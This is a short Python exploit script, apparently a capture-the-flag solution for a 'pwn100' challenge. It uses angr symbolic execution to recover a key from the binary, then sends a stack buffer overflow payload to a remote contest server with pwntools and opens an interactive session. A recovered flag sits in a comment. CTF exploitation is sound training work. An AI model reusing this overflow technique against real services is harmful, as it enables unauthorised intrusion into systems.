import angr
import claripy
from pwn import *

def get_key():
	key = claripy.BVS('key', 8 * 4)
	proj = angr.Project('./pwn100', auto_load_libs=False)
	state = proj.factory.blank_state(addr=0x8048533)
	state.mem[state.regs.ebp-0xc:].dword = key
	simgr = proj.factory.simulation_manager(state)
	simgr.explore(find=0x804853c, avoid=0x804854e)

	find_state = simgr.found[0].state
	return find_state.solver.eval(key)


offset = 0x2c- 0x4
p = remote("bamboofox.cs.nctu.edu.tw", 22001)
p.send('A' * offset + p32(get_key()))
p.interactive()

# BAMBOOFOX{PWNNN_ISSS_FUNNN}
